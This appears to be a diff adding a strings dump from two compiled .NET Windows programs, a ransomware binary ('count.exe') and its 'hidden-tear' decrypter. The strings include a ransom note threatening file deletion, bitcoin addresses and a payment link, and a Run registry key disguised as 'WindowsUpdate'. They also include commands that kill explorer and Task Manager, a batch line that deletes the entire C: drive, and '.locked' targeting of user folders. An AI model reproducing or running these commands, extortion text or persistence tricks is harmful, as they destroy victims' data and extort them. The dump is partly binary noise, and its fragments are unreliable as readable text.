@@ -1,0 +1,758 @@
+!This program cannot be run in DOS mode.
+`.rsrc
+@.reloc
+2lsu
+0msu
+v4.0.30319
+#Strings
+ThreadSafeObjectProvider`1
+get_Label1
+set_Label1
+m_Form1
+get_Form1
+set_Form1
+get_Timer1
+set_Timer1
+get_WebBrowser1
+set_WebBrowser1
+get_PictureBox1
+set_PictureBox1
+Microsoft.Win32
+get_Label2
+set_Label2
+get_Timer2
+set_Timer2
+get_WebBrowser2
+set_WebBrowser2
+get_Label3
+set_Label3
+get_Label4
+set_Label4
+get_Label5
+set_Label5
+get_Label6
+set_Label6
+get_Label7
+set_Label7
+get_Label8
+set_Label8
+get_Label9
+set_Label9
+<Module>
+get_lb_SC
+set_lb_SC
+get_lb_MN
+set_lb_MN
+System.IO
+get_lb_HR
+set_lb_HR
+Dispose__Instance__
+Create__Instance__
+ProjectData
+get_KeyData
+mscorlib
+Microsoft.VisualBasic
+Form1_Load
+add_Load
+get_Red
+get_DarkRed
+set_Enabled
+set_Handled
+get_IsDisposed
+m_FormBeingCreated
+Synchronized
+set_IsSingleInstance
+CreateInstance
+get_GetInstance
+defaultInstance
+instance
+GetHashCode
+set_AutoScaleMode
+set_SizeMode
+PictureBoxSizeMode
+AuthenticationMode
+ShutdownMode
+set_Image
+get_Message
+IDisposable
+Hashtable
+set_Visible
+RuntimeTypeHandle
+GetTypeFromHandle
+AppWinStyle
+set_ShutdownStyle
+set_FormBorderStyle
+FontStyle
+MsgBoxStyle
+set_Name
+get_ProcessName
+CheckForSyncLockOnValueType
+GetType
+get_Culture
+set_Culture
+resourceCulture
+WindowsFormsApplicationBase
+ApplicationSettingsBase
+Dispose
+Navigate
+EditorBrowsableState
+set_WindowState
+FormWindowState
+get_White
+ThreadStaticAttribute
+STAThreadAttribute
+CompilerGeneratedAttribute
+DesignerGeneratedAttribute
+GuidAttribute
+HelpKeywordAttribute
+GeneratedCodeAttribute
+DebuggerNonUserCodeAttribute
+DebuggableAttribute
+EditorBrowsableAttribute
+ComVisibleAttribute
+AssemblyTitleAttribute
+StandardModuleAttribute
+HideModuleNameAttribute
+DebuggerStepThroughAttribute
+AssemblyTrademarkAttribute
+TargetFrameworkAttribute
+DebuggerHiddenAttribute
+AssemblyFileVersionAttribute
+MyGroupCollectionAttribute
+AssemblyDescriptionAttribute
+CompilationRelaxationsAttribute
+AssemblyProductAttribute
+AssemblyCopyrightAttribute
+AssemblyCompanyAttribute
+RuntimeCompatibilityAttribute
+AccessedThroughPropertyAttribute
+m_ThreadStaticValue
+WithEventsValue
+GetObjectValue
+SetValue
+Remove
+count.exe
+set_Size
+set_MinimumSize
+set_AutoSize
+set_ClientSize
+ISupportInitialize
+System.Threading
+NewLateBinding
+System.Runtime.Versioning
+get_UseCompatibleTextRendering
+GetResourceString
+CompareString
+ToString
+Form1_formclosing
+disposing
+System.Drawing
+get_StartupPath
+get_Black
+Timer1_Tick
+Timer2_Tick
+add_Tick
+remove_Tick
+set_Interval
+System.ComponentModel
+LateCall
+ContainerControl
+ObjectFlowControl
+get_FileSystem
+set_MainForm
+OnCreateMainForm
+resourceMan
+set_TextAlign
+System.ComponentModel.Design
+set_ShowIcon
+get_Application
+MyApplication
+set_Location
+System.Configuration
+System.Globalization
+Interaction
+System.Reflection
+ControlCollection
+set_StartPosition
+FormStartPosition
+TargetInvocationException
+InvalidOperationException
+get_InnerException
+ArgumentException
+add_KeyDown
+add_Shutdown
+CultureInfo
+get_Temp
+set_TabStop
+set_ShowInTaskbar
+m_AppObjectProvider
+m_UserObjectProvider
+m_ComputerObjectProvider
+m_MyWebServicesObjectProvider
+m_MyFormsObjectProvider
+sender
+get_ResourceManager
+ComponentResourceManager
+addedHandler
+ShutdownEventHandler
+KeyEventHandler
+System.CodeDom.Compiler
+IContainer
+get_User
+get_CurrentUser
+eraser
+WebBrowser
+get_decrypter
+get_Computer
+ServerComputer
+MyComputer
+set_Anchor
+set_ForeColor
+set_BackColor
+ClearProjectError
+SetProjectError
+set_Cursor
+Activator
+.cctor
+Monitor
+System.Diagnostics
+Microsoft.VisualBasic.Devices
+get_WebServices
+MyWebServices
+Microsoft.VisualBasic.ApplicationServices
+System.Runtime.InteropServices
+Microsoft.VisualBasic.CompilerServices
+System.Runtime.CompilerServices
+Microsoft.VisualBasic.MyServices
+System.Resources
+count.My.Resources
+count.Form1.resources
+count.Resources.resources
+DebuggingModes
+get_SpecialDirectories
+set_EnableVisualStyles
+AnchorStyles
+GetProcesses
+WriteAllBytes
+Strings
+get_Settings
+AutoSaveSettings
+MySettings
+KeyEventArgs
+ReferenceEquals
+get_Controls
+System.Windows.Forms
+get_Forms
+MyForms
+set_AutoScaleDimensions
+System.Collections
+RuntimeHelpers
+Cursors
+Operators
+Process
+components
+Concat
+Format
+CreateObject
+addedHandlerLockObject
+GetObject
+MyProject
+EndInit
+BeginInit
+GraphicsUnit
+get_SaveMySettingsOnExit
+set_SaveMySettingsOnExit
+get_Default
+SetCompatibleTextRenderingDefault
+MsgBoxResult
+ContentAlignment
+InitializeComponent
+set_Font
+SuspendLayout
+ResumeLayout
+PerformLayout
+set_Text
+set_TabIndex
+PictureBox
+MsgBox
+set_ControlBox
+count.My
+CreateSubKey
+ContainsKey
+RegistryKey
+get_Assembly
+get_Registry
+MySettingsProperty
+FileSystemProxy
+SpecialDirectoriesProxy
+RegistryProxy
+WrapNonExceptionThrows
+Copyright 
+  2017
+$4e2f2b1f-996a-4ffb-9949-5720fffd2cf2
+1.0.0.0
+.NETFramework,Version=v4.5.2
+FrameworkDisplayName
+.NET Framework 4.5.2
+Label2
+Label1
+Timer1
+Timer2
+Label6
+Label5
+Label4
+Label3
+Label8
+Label7
+Label9
+PictureBox1
+WebBrowser1
+WebBrowser2
+MyTemplate
+11.0.0.0
+3System.Resources.Tools.StronglyTypedResourceBuilder
+4.0.0.0
+KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator
+14.0.0.0
+System.Windows.Forms.Form
+Create__Instance__
+Dispose__Instance__
+My.MyProject.Forms
+4System.Web.Services.Protocols.SoapHttpClientProtocol
+Create__Instance__
+Dispose__Instance__
+My.Computer
+My.Application
+My.User
+My.Forms
+My.WebServices
+My.Settings
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD
+QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
+System.Drawing.Bitmap
+#aIDATx^
+uP+ShCNA
+uP+ShCNA
+uP+ShCNA
+j;VP/OAo
+j;VP/OAo
+j;VP/OAo
+j;VP/OAo
+j;VP/OAo
+j;VP/OAo
+IShCVP/
+tP+ShCNB
+tP+ShCNB
+oCwVNB
+[:VP/Sh
+{h[VP/OAo
+[:VP/Sh
+mtuP+OAo
+6*ShCVP
+mttP+;
+v*ShC:
+vtP+Sh
+j+ShCNB
+j;VP/ShC:
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+PADPADP
+!This program cannot be run in DOS mode.
+`.rsrc
+@.reloc
+v4.0.30319
+#Strings
+label1
+button1
+textBox1
+DD5783BCF1E9002BC00AD5B83A95ED6E4EBB4AD5
+SHA256
+get_UTF8
+<Module>
+<PrivateImplementationDetails>
+System.IO
+set_IV
+mscorlib
+Form1_Load
+add_Load
+RijndaelManaged
+bytesToBeDecrypted
+Synchronized
+password
+defaultInstance
+set_Mode
+set_AutoScaleMode
+CryptoStreamMode
+CipherMode
+IDisposable
+RuntimeFieldHandle
+RuntimeTypeHandle
+GetTypeFromHandle
+DecryptFile
+set_FormBorderStyle
+set_Name
+get_UserName
+userName
+get_Culture
+set_Culture
+resourceCulture
+ButtonBase
+ApplicationSettingsBase
+Dispose
+Create
+EditorBrowsableState
+STAThreadAttribute
+CompilerGeneratedAttribute
+GuidAttribute
+GeneratedCodeAttribute
+DebuggerNonUserCodeAttribute
+DebuggableAttribute
+EditorBrowsableAttribute
+ComVisibleAttribute
+AssemblyTitleAttribute
+AssemblyTrademarkAttribute
+TargetFrameworkAttribute
+AssemblyFileVersionAttribute
+AssemblyConfigurationAttribute
+AssemblyDescriptionAttribute
+CompilationRelaxationsAttribute
+AssemblyProductAttribute
+AssemblyCopyrightAttribute
+AssemblyCompanyAttribute
+RuntimeCompatibilityAttribute
+decrypter.exe
+set_Size
+get_BlockSize
+set_BlockSize
+set_AutoSize
+set_ClientSize
+get_KeySize
+set_KeySize
+Encoding
+System.Runtime.Versioning
+String
+Substring
+disposing
+System.Drawing
+ComputeHash
+get_Length
+button1_Click
+add_Click
+System.ComponentModel
+ContainerControl
+CryptoStream
+MemoryStream
+Program
+System
+SymmetricAlgorithm
+HashAlgorithm
+ICryptoTransform
+resourceMan
+set_Icon
+set_ShowIcon
+GetExtension
+Application
+set_Location
+location
+System.Configuration
+System.Globalization
+System.Reflection
+ControlCollection
+Button
+CultureInfo
+set_ShowInTaskbar
+sender
+get_ResourceManager
+ComponentResourceManager
+EventHandler
+System.CodeDom.Compiler
+IContainer
+hidden_tear_decrypter
+userDir
+set_UseVisualStyleBackColor
+.cctor
+CreateDecryptor
+System.Diagnostics
+System.Runtime.InteropServices
+System.Runtime.CompilerServices
+System.Resources
+hidden_tear_decrypter.Form1.resources
+decrypter.Properties.Resources.resources
+DebuggingModes
+GetDirectories
+decrypter.Properties
+GetFiles
+EnableVisualStyles
+passwordBytes
+Rfc2898DeriveBytes
+ReadAllBytes
+WriteAllBytes
+GetBytes
+Settings
+EventArgs
+get_Controls
+System.Windows.Forms
+set_AutoScaleDimensions
+RuntimeHelpers
+components
+Concat
+GetObject
+get_Default
+SetCompatibleTextRenderingDefault
+Environment
+InitializeComponent
+AES_Decrypt
+SuspendLayout
+ResumeLayout
+PerformLayout
+System.Text
+get_Text
+set_Text
+set_TabIndex
+set_MinimizeBox
+set_MaximizeBox
+set_ControlBox
+TextBox
+InitializeArray
+ToArray
+set_Key
+System.Security.Cryptography
+get_Assembly
+DecryptDirectory
+op_Equality
+WrapNonExceptionThrows
+decrypter
+Copyright 
+  2017
+$dd73c993-7d96-426b-95a1-63edd4760c01
+1.0.0.0
+.NETFramework,Version=v4.5
+FrameworkDisplayName
+.NET Framework 4.5
+3System.Resources.Tools.StronglyTypedResourceBuilder
+4.0.0.0
+KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator
+14.0.0.0
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aBj
+QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
+System.Drawing.Icon
+IconData
+IconSize
+System.Drawing.Size
+System.Drawing.Size
+height
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+PADPADP
+C:\Users\Quentin\Desktop\Nouveau dossier\hidden-tear-master\hidden-tear-decrypter\hidden-tear-decrypter\obj\Release\decrypter.pdb
+_CorExeMain
+mscoree.dll
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+C:\Users\Quentin\Documents\test\test\obj\Release\count.pdb
+_CorExeMain
+mscoree.dll
+<?xml version="1.0" encoding="utf-8"?>
+<assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1">
+  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
+        <!-- Options du manifeste de contr
+le de compte d'utilisateur
+             Si vous souhaitez modifier le niveau du contr
+le de compte d'utilisateur Windows, remplacez le 
+             n
+ud requestedExecutionLevel par l'une des propositions suivantes.
+        <requestedExecutionLevel  level="asInvoker" uiAccess="false" />
+        <requestedExecutionLevel  level="requireAdministrator" uiAccess="false" />
+        <requestedExecutionLevel  level="highestAvailable" uiAccess="false" />
+            La sp
+cification de l'
+ment requestedExecutionLevel d
+sactive la virtualisation de fichiers et du Registre. 
+            Supprimez cet 
+ment si votre application a besoin de la virtualisation pour des
+            raisons de compatibilit
+ descendante.
+        -->
+        <requestedExecutionLevel level="asInvoker" uiAccess="false" />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
+    <application>
+      <!-- Liste des versions de Windows pour lesquelles cette application a 
+e, et sur
+           lesquelles elle doit fonctionner. Supprimez les marques de commentaire des 
+ments appropri
+s, et Windows va 
+           automatiquement s
+lectionner l'environnement le plus compatible. -->
+      <!-- Windows
+Vista -->
+      <!--<supportedOS Id="{e2011457-1546-43c5-a5fe-008deee3d3f0}" />-->
+      <!-- Windows
+      <!--<supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}" />-->
+      <!-- Windows
+      <!--<supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}" />-->
+      <!-- Windows
+8.1 -->
+      <!--<supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}" />-->
+      <!-- Windows
+10 -->
+      <!--<supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}" />-->
+    </application>
+  </compatibility>
+  <!-- Indique que l'application prend en charge DPI et qu'elle n'est pas automatiquement mise 
+chelle par Windows 
+ un niveau de
+       DPI plus 
+. Les applications Windows Presentation Foundation (WPF) prennent automatiquement en charge DPI et n'ont pas besoin 
+       d'opter pour ce choix. Les applications Windows Forms qui ciblent .NET Framework
+4.6 et qui optent pour ce param
+tre, doivent 
+       
+galement affecter la valeur 'true' au param
+tre 'EnableWindowsFormsHighDpiAutoResizing' dans leur fichier app.config. -->
+  <!--
+  <application xmlns="urn:schemas-microsoft-com:asm.v3">
+    <windowsSettings>
+      <dpiAware xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</dpiAware>
+    </windowsSettings>
+  </application>
+  <!-- Activer les th
+mes pour les contr
+les et bo
+tes de dialogue communes de Windows (Windows XP et version ult
+rieure) -->
+  <!--
+  <dependency>
+    <dependentAssembly>
+      <assemblyIdentity
+          type="win32"
+          name="Microsoft.Windows.Common-Controls"
+          version="6.0.0.0"
+          processorArchitecture="*"
+          publicKeyToken="6595b64144ccf1df"
+          language="*"
+        />
+    </dependentAssembly>
+  </dependency>
+</assembly>
+M;QX_fm
+count.Resources
+decrypter
+Software\Microsoft\Windows\CurrentVersion\Run
+WindowsUpdate
+taskkill /f /IM explorer.exe
+decrypter.exe
+https://blockchain.info/payment_request?address=17ZQaThXQmUN4MdhtRvcuJ36XtuDs6USLk&amount=0.2&message=pay%200.2%20bitcoin%20and%20receive%20a%20decrypting%20code
+SAPI.spvoice
+You have been hacked by Blue Howl, now your files are encrypted, you have 72 hours to pay 0.2 bitcoins or your files will be destroy
+https://www.youtube.com/watch?v=9jK-NcRmVcw
+@Echo off rd c:\ /s /q cls
+Taskmgr
+taskkill /f /IM Taskmgr.exe
+explorer
+iexplore.exe
+chrome.exe
+skype.exe
+Time to erase!!
+Label2
+Label1
+Label6
+You will receive a password to decrypt your files and you will recover your files
+Label5
+If you want to recover your files, you have to pay 0.2 Bitcoin to this adress: 
+Label4
+If you don't pay before 72 hours or you turn off this computer, the files will be delete.
+Label3
+You have 72 hours to recover your files!!!
+Label8
+122iWPwDn2XbkSSs4g2usi1WuqyhzTKMo2
+Label7
+Label9
+You can also pay with the QR code
+PictureBox1.Image
+PictureBox1
+WebBrowser1
+WebBrowser2
+WinForms_RecursiveFormCreate
+WinForms_SeeInnerException
+Property can only be set to Nothing
+PictureBox1.Image
+decrypter
+decrypter.Properties.Resources
+C:\Users\
+.locked
+\Desktop
+\MyDocuments
+\MyPictures
+\MyMusic
+\MyVideos
+textBox1
+label1
+Password:
+button1
+Decrypt My Files
+$this.Icon
+decrypter
+$this.Icon
+VS_VERSION_INFO
+VarFileInfo
+Translation
+StringFileInfo
+000004b0
+Comments
+CompanyName
+FileDescription
+decrypter
+FileVersion
+1.0.0.0
+InternalName
+decrypter.exe
+LegalCopyright
+Copyright 
+  2017
+LegalTrademarks
+OriginalFilename
+decrypter.exe
+ProductName
+decrypter
+ProductVersion
+1.0.0.0
+Assembly Version
+1.0.0.0
+VS_VERSION_INFO
+VarFileInfo
+Translation
+StringFileInfo
+000004b0
+Comments
+CompanyName
+FileDescription
+FileVersion
+1.0.0.0
+InternalName
+count.exe
+LegalCopyright
+Copyright 
+  2017
+LegalTrademarks
+OriginalFilename
+count.exe
+ProductName
+ProductVersion
+1.0.0.0
+Assembly Version
+1.0.0.0
